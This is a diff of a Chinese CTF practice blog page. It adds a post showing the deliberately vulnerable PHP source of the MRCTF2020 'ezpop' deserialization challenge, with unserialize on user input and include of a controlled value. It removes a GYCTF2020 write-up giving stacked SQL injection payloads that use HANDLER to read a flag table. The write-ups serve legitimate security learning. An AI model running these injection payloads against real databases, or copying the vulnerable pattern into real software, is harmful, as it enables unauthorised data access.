@@ -277,6 +277,123 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-pop" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/03/30/pop/" class="article-date">
+      <time datetime="2021-03-30T09:02:06.000Z" itemprop="datePublished">2021-03-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/03/30/pop/">Pop链-&gt;[MRCTF2020]ezpop</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>打开题目，给出如下代码:</p>
+<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//flag is in flag.php</span>
+<span class="token comment">//WTF IS THIS?</span>
+<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
+<span class="token comment">//And Crack It!</span>
+<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
+    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
+    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">&#61;</span><span class="token single-quoted-string string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token single-quoted-string string">&#39;Welcome to &#39;</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&#34;&lt;br&gt;&#34;</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
+            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&#34;hacker&#34;</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token double-quoted-string string">&#34;index.php&#34;</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
+    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+        <span class="token variable">$function</span> <span class="token operator">&#61;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;pop&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+    &#64;<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;pop&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;<!-- --></span>
+    <span class="token variable">$a</span><span class="token operator">&#61;</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> 
+</code></pre> 
+<p><code>反序列化pop链魔法函数</code>，魔法函数方法在前面有总结</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+        <p class="article-more-link">
+          <a   href="/2021/03/30/pop/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-fxl" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1060,134 +1177,6 @@ git checkout v5.0.23
 
 <p>题目出来后，是一个搜索页面，f12也没什么发现，在搜索框输入1：<br><img src="/2021/02/14/guge/g1.png"><br>搜索后出现以下内容：<br><img src="/2021/02/14/guge/g2.png"><br>ssti模板注入，又是崭新的东西=……=|||，虽然前面做过了一题tornado模板的，但是差别很大，我太难了||||<br>既然是ssti模板注入，尝试一下，比如说，在搜索框中输入4，会显示4 ，说明后端有处理渲染。<br>用下面的流程图测试一下，看看是什么模板引擎：<br><img src="/2021/02/14/guge/g4.png"><br>用Payload测试之后发现是jinjia2的模板引擎，然后构造jinjia2 ssti的命令执行payload：<br><img src="/2021/02/14/guge/g5.png"><br><img src="/2021/02/14/guge/g6.png"><br>的到flag！~<br>这道题是真的不知道是个什么情况=….=，看大佬博客也搞不清楚状况，只能这样了<br>参考：<br>SSTI模板注入参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">https://www.jianshu.com/p/aef2ae0498df</a><br>ssti/沙盒逃逸详细总结：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172#h2-13">https://www.anquanke.com/post/id/188172#h2-13</a><br>服务段模板注入攻击：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p>
 </li.__bases__></li></ul>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-list" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/02/12/list/" class="article-date">
-      <time datetime="2021-02-12T09:17:13.000Z" itemprop="datePublished">2021-02-12</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/02/12/list/">23-buu练习[GYCTF2020]Blacklist</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2>知识点</h2>
-
-<p>一、堆叠注入<br>查表名、列名、字段名</p>
-<ol>
-<li>show databases;
-</li><li>show tables;
-</li><li>show columns from `table_name`;
-</li></ol>
-
-<p>二、本题使用HANDLER查看flag</p>
-<ol>
-<li>1';
-</li><li>handler FlagHere open;
-</li><li>handler FlagHere read first;
-</li><li>handler FlagHere close;#
-</li></ol>
-
-<p>三、HANDLER<br>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
-<ul>
-<li>HANDLER tbl_name OPEN [ [AS] alias]
-</li><li>HANDLER tbl_name READ index_name { = | <= |>= | < | > } (value1,value2,...)
-<li>    [ WHERE where_condition ] [LIMIT ... ]
-</li><li>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
-</li><li>    [ WHERE where_condition ] [LIMIT ... ]
-</li><li>HANDLER tbl_name READ { FIRST | NEXT }
-</li><li>    [ WHERE where_condition ] [LIMIT ... ]
-</li><li>HANDLER tbl_name CLOSE 
-</li><li>//其中  HANDLER tbl_name OPEN AS example
-</li><li>//其后  HANDLER example READ index_name="example2"
-</li></=></li></ul>
-
-<p>四、预处理语句使用方法</p>
-<ol>
-<li>PREPARE name from '[my sql sequece]';   //预定义SQL语句
-</li><li>EXECUTE name;  //执行预定义SQL语句
-</li><li>(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
-</li></ol>
-<ol>
-<li>SET @tn = 'hahaha';  //存储表名
-</li><li>SET @sql = concat('select * from ', @tn);  //存储SQL语句
-</li><li>PREPARE name from @sql;   //预定义SQL语句
-</li><li>EXECUTE name;  //执行预定义SQL语句
-</li><li>(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
-</li></ol>
-
-<h2>题目</h2>
-
-<p>提交 1’ 报错确定存在sql注入<br>提交 1’# 返回正常<br>提交 1’select# 返回黑名单:<br><img src="/2021/02/12/list/q1.png"><br>禁用了select和where等关键字<br>采用堆叠注入<br>首先查询列数：</p>
-<ul>
-<li>1' order by 2#]
-</li></ul>
-
-<p>列数为2</p>
-<p>union等关键词被过滤 正常注入无法进行<br>考虑堆叠注入——使用分号结束上一个语句再叠加其他语句一起执行；</p>
-<ul>
-<li>1' and 1=2;show databases#
-</li><li>1' and 1=2;show tables#
-</li></ul>
-
-<p><img src="/2021/02/12/list/q2.png"><br>然后</p>
-<ul>
-<li>1' and 1=2;desc `FlagHere`#
-</li></ul>
-
-<p><img src="/2021/02/12/list/q3.png"><br>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭<br>payload如下：</p>
-<ul>
-<li>1';
-HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
-</li></ul>
-
-<p><img src="/2021/02/12/list/q4.png"><br>得到flag~~</p>
-
       
     </div>
     
